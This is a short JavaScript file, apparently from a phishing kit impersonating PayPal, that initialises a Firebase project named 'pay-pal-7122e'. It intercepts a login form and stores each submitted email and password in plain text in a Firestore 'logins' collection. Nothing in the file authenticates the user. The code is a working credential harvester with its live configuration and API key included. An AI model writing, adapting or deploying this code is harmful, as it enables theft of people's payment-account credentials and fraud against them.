// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDEThEKEhSUUMEhrK-f2gV1HRMJaM-xZZk",
  authDomain: "pay-pal-7122e.firebaseapp.com",
  projectId: "pay-pal-7122e",
  storageBucket: "pay-pal-7122e.firebasestorage.app",
  messagingSenderId: "819742812568",
  appId: "1:819742812568:web:87c11757069edcc4d563ed",
  measurementId: "G-G6CKR5XGJ4"
  };
  
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
  
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
  
    db.collection("logins").add({
      email,
      password,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(() => {
      alert("Login info submitted!");
      document.getElementById("loginForm").reset();
    })
    .catch((error) => {
      console.error("Error writing document: ", error);
    });
  });
  